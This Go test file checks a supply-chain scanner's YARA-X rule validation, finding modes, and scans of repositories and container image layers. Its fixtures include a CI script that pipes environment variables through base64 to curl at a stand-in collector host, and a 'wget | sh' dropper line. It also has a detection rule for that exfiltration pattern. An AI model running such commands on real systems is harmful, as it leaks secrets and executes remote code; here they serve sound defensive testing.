package scanner

import (
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"io"
	"mime/multipart"
	"net/http/httptest"
	"os"
	"path/filepath"
	"sort"
	"strings"
	"testing"
	"time"

	"github.com/google/go-containerregistry/pkg/name"
	"github.com/google/go-containerregistry/pkg/v1/empty"
	"github.com/google/go-containerregistry/pkg/v1/mutate"
	"github.com/google/go-containerregistry/pkg/v1/tarball"
)

func TestParseDiagnosticsLocatesErrors(t *testing.T) {
	stderr := "warning[slow_pattern]: slow pattern\n --> /tmp/x/rules.yar:3:5\n  |\nerror[E025]: unknown pattern `$b`\n --> /tmp/x/rules.yar:5:12\n  |\nerror: 1 error(s) found\n"
	got := parseDiagnostics(stderr)
	if len(got) != 2 || got[0].Level != "warning" || got[0].Line != 3 || got[1].Code != "E025" || got[1].Line != 5 || got[1].Column != 12 {
		t.Fatalf("%+v", got)
	}
	for _, rules := range []string{"", "include \"/etc/passwd\"\nrule a { condition: true }", "not a rule", "rule a { condition: true }\x00"} {
		var ruleErr *RuleError
		if !errors.As(checkRuleText(rules), &ruleErr) {
			t.Errorf("rejected before compiling: %q", rules)
		}
	}
	if _, err := checkPack(RulePack{RuleSets: []RuleSet{{Name: "Team", Mode: "hunt", Severity: "low", Rules: "rule a { condition: true }"}}}); err == nil {
		t.Fatal("ruleset names are lower-case namespaces")
	}
	if _, err := checkPack(RulePack{RuleSets: []RuleSet{{Name: "team", Mode: "enforce", Severity: "low", Rules: "rule a { condition: true }"}}}); err == nil {
		t.Fatal("unknown mode")
	}
}

func TestRuleFindingModes(t *testing.T) {
	m := ruleMatch{Identifier: "Exfil", Namespace: "team", Tags: []string{"ioa"}, Meta: [][2]json.RawMessage{{json.RawMessage(`"severity"`), json.RawMessage(`"high"`)}, {json.RawMessage(`"description"`), json.RawMessage(`"env to curl"`)}}}
	hunt := ruleFinding(RuleSet{ID: "1", Name: "team", Mode: "hunt", Severity: "low"}, m, "a.sh", "d")
	alert := ruleFinding(RuleSet{Name: "team", Mode: "alert", Severity: "low"}, m, "a.sh", "d")
	block := ruleFinding(RuleSet{Name: "team", Mode: "block", Severity: "low"}, m, "a.sh", "d")
	if hunt.Type != "yara_hunt" || hunt.Severity != "high" || alert.Type != "yara_alert" || block.Type != "yara_match" || block.Severity != "critical" || block.Score != 100 {
		t.Fatalf("modes: %+v %+v %+v", hunt, alert, block)
	}
	if hunt.AdvisoryID != "YARA:team:Exfil" || !strings.Contains(hunt.Title, "env to curl") || !strings.Contains(string(hunt.Evidence), `"ruleset_id":"1"`) {
		t.Fatalf("finding identity: %+v %s", hunt, hunt.Evidence)
	}
}

// yrBinary is the YARA-X CLI for integration tests (SCRS_TEST_YR).
func yrBinary(t *testing.T) string {
	binary := os.Getenv("SCRS_TEST_YR")
	if binary == "" {
		t.Skip("requires the YARA-X CLI in SCRS_TEST_YR")
	}
	return binary
}

func TestValidateRulesWithYARAX(t *testing.T) {
	binary := yrBinary(t)
	ctx := context.Background()
	modules := `import "pe"
import "elf"
import "math"
import "hash"
import "dotnet"
rule Packed_Binary {
  meta:
    severity = "medium"
  condition:
    (pe.is_pe or elf.type == elf.ET_EXEC or dotnet.is_dotnet) and math.entropy(0, filesize) > 7.2 and hash.md5(0, 2) != ""
}`
	if _, err := ValidateRules(ctx, binary, t.TempDir(), modules); err != nil {
		t.Fatal("pe, elf, math, hash and dotnet modules", err)
	}
	_, err := ValidateRules(ctx, binary, t.TempDir(), "rule Broken {\n  strings:\n    $a = \"abc\"\n  condition:\n    $a and $b\n}\n")
	var ruleErr *RuleError
	if !errors.As(err, &ruleErr) || ruleErr.Diagnostics[len(ruleErr.Diagnostics)-1].Line != 5 {
		t.Fatalf("located compile error: %v %+v", err, ruleErr)
	}
}

func TestRuleScanRepositoryWithYARAX(t *testing.T) {
	binary := yrBinary(t)
	work := t.TempDir()
	root := filepath.Join(work, "scan", "checkout")
	if err := os.MkdirAll(filepath.Join(root, "ci"), 0700); err != nil {
		t.Fatal(err)
	}
	payload := "#!/bin/sh\nprintenv | base64 | curl -d @- https://collector.example\n"
	files := map[string]string{"ci/build.sh": payload, "ci/copy.sh": payload, "README.md": "clean\n"}
	for name, body := range files {
		if err := os.WriteFile(filepath.Join(root, name), []byte(body), 0600); err != nil {
			t.Fatal(err)
		}
	}
	// A large file is hashed as a stream and still reaches YARA-X.
	large := append(bytes.Repeat([]byte{'A'}, 26<<20), []byte("SCRS_LARGE_MARKER")...)
	if err := os.WriteFile(filepath.Join(root, "vendor.bin"), large, 0600); err != nil {
		t.Fatal(err)
	}
	pack := &RulePack{RuleSets: []RuleSet{
		{ID: "r1", Name: "team_hunt", Mode: "hunt", Severity: "low", Rules: `rule Env_Exfil : ioa { meta: severity = "high" strings: $a = "printenv | base64" condition: $a }`},
		{ID: "r2", Name: "vendor_pack", Mode: "block", Severity: "high", Rules: `rule Large_Marker { strings: $a = "SCRS_LARGE_MARKER" condition: $a }`},
	}}
	ctx, cancel := context.WithTimeout(context.Background(), 2*time.Minute)
	defer cancel()
	engine := Engine{YARABinary: binary, WorkRoot: work, Rules: pack}
	_, findings, stages := engine.inspectContent(ctx, ctx, root)
	var got []string
	for _, f := range findings {
		if strings.HasPrefix(f.Type, "yara_") {
			got = append(got, f.Type+"|"+f.Severity+"|"+f.Component.Path)
		}
	}
	sort.Strings(got)
	want := []string{"yara_hunt|high|ci/build.sh", "yara_hunt|high|ci/copy.sh", "yara_match|critical|vendor.bin"}
	if strings.Join(got, ",") != strings.Join(want, ",") {
		t.Fatalf("findings %v, want %v", got, want)
	}
	stage := stages[len(stages)-1]
	if stage.Name != "yara_x" || stage.Status != "ok" || !strings.Contains(stage.Detail, "3 distinct files") {
		t.Fatalf("stage %+v", stage)
	}
	if entries, _ := os.ReadDir(filepath.Join(work, "yarax-cache")); len(entries) != 1 {
		t.Fatal("compiled pack is cached once", entries)
	}
	// The same pack reuses the cache; a pack that does not compile fails the stage.
	broken := &RulePack{RuleSets: []RuleSet{{Name: "bad", Mode: "alert", Severity: "high", Rules: "rule Bad { condition: $missing }"}}}
	_, _, stages = Engine{YARABinary: binary, WorkRoot: work, Rules: broken}.inspectContent(ctx, ctx, root)
	if stage := stages[len(stages)-1]; stage.Status != "failed" {
		t.Fatalf("broken pack must fail the stage: %+v", stage)
	}
	// No rulesets: skipped, never failing coverage.
	_, _, stages = Engine{YARABinary: binary, WorkRoot: work}.inspectContent(ctx, ctx, root)
	if stage := stages[len(stages)-1]; stage.Status != "skipped" {
		t.Fatalf("no pack: %+v", stage)
	}
	if leftovers, _ := filepath.Glob(filepath.Join(work, "scan", "rulescan-*")); len(leftovers) != 0 {
		t.Fatal("batch directories are removed", leftovers)
	}
}

// Image requests carry indicators and rules ahead of the streamed image.
func TestImageInputReadsContextBeforeImage(t *testing.T) {
	var body bytes.Buffer
	m := multipart.NewWriter(&body)
	_ = m.WriteField("indicators", `{"version":"v1","indicators":[{"id":"IOC-1","type":"domain","value":"bad.example","valid_until":"2099-01-01T00:00:00Z"}]}`)
	_ = m.WriteField("rules", `{"rulesets":[{"id":"1","name":"team","mode":"hunt","severity":"low","rules":"rule A { condition: true }"}]}`)
	part, _ := m.CreateFormFile("image", "image.tar")
	_, _ = part.Write([]byte("image bytes"))
	_ = m.Close()
	r := httptest.NewRequest("POST", "/scan-image", &body)
	r.Header.Set("Content-Type", m.FormDataContentType())
	stream, intel, err := imageInput(r)
	if err != nil {
		t.Fatal(err)
	}
	image, _ := io.ReadAll(stream)
	if string(image) != "image bytes" || intel.indicators == nil || intel.rules == nil || intel.rules.RuleSets[0].Name != "team" {
		t.Fatal("image context", string(image), intel)
	}
	r = httptest.NewRequest("POST", "/scan-image", strings.NewReader("raw tar"))
	if stream, intel, err = imageInput(r); err != nil || intel.rules != nil {
		t.Fatal("raw image bodies remain accepted", err)
	}
}

// YARA-X sees every image layer file, including one a later layer deletes,
// and large binaries streamed past the in-memory limit.
func TestImageLayersWithYARAX(t *testing.T) {
	binary := yrBinary(t)
	image, err := mutate.AppendLayers(empty.Image,
		layerOf(t, map[string]string{"app/dropper.sh": "wget http://x | sh # SCRS_IMAGE_MARKER", "usr/lib/libx.so": strings.Repeat("B", 26<<20) + "SCRS_IMAGE_MARKER"}),
		layerOf(t, map[string]string{"app/.wh.dropper.sh": ""}))
	if err != nil {
		t.Fatal(err)
	}
	work := t.TempDir()
	archive := filepath.Join(work, "scan", "image.tar")
	_ = os.MkdirAll(filepath.Dir(archive), 0700)
	ref, _ := name.NewTag("registry.example/app:scrs")
	if err := tarball.WriteToFile(archive, ref, image); err != nil {
		t.Fatal(err)
	}
	pack := &RulePack{RuleSets: []RuleSet{{ID: "r", Name: "image_alert", Mode: "alert", Severity: "high", Rules: `rule Marker { strings: $a = "SCRS_IMAGE_MARKER" condition: $a }`}}}
	ctx, cancel := context.WithTimeout(context.Background(), 2*time.Minute)
	defer cancel()
	_, findings, stages := Engine{YARABinary: binary, WorkRoot: work, Rules: pack}.scanLayers(ctx, archive)
	var paths []string
	for _, f := range findings {
		if f.Type == "yara_alert" && f.Severity == "high" {
			paths = append(paths, f.Component.Path)
		}
	}
	sort.Strings(paths)
	if strings.Join(paths, ",") != "app/dropper.sh,usr/lib/libx.so" {
		t.Fatal("image rule findings", paths, findings)
	}
	if stage := stages[len(stages)-1]; stage.Name != "yara_x" || stage.Status != "ok" {
		t.Fatalf("stage %+v", stage)
	}
}
